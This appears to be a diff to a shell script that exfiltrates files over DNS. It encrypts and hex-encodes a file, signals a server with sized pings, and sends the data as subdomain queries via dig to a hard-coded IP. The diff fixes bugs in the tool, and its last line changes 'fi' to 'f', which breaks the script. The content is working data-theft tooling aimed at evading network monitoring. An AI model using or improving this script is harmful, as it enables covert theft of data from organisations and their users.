@@ -1,6 +1,6 @@
 #!/bin/sh
 
-svr=kbox.a.net  ## need to change this
+svr=192.168.181.173  ## need to change this
 
 # send exfil start signal to server
 signal_exfil_start()
@@ -9,7 +9,7 @@ signal_exfil_start()
   sleep 1
   ping -c 1 -s 57 $svr
   sleep 1
-  ping -c 1 -s 88 $svra
+  ping -c 1 -s 88 $svr
 }
 
 # send exfil stop signal to server
@@ -27,12 +27,11 @@ send_exfil()
 {
   echo signaling server for start...
   signal_exfil_start
-  sleep 30 # a time delay to allow server time to receive exfil start signal
-
-    for dnsx in `cat $1.hex `; do dig $dnsx.k.a.net; done
+  sleep 20 # a time delay to allow server time to receive exfil start signal
+    for dnsx in `cat $1.hex `; do dig $dnsx.$svr; done
   sleep 10 # a time delay for server
   echo signaling server for stop
-  signal_exfil_stop	
+  signal_exfil_stop $1
   echo exfil sent
 }
 
@@ -52,10 +51,11 @@ usage () {
 #
 
   if [ $1 ]; then
-  openssl aes-256-cbc -in $1 -out $1.1 -k 1234
+  echo $1 
+openssl aes-256-cbc -in $1 -out $1.1 -k 1234
   tar -zcf $1.tgz $1.1
   xxd -p $1.tgz > $1.hex
-  send_exfil
-  cleanup
+  send_exfil $1
+  cleanup $1
 else usage
-fi
+f
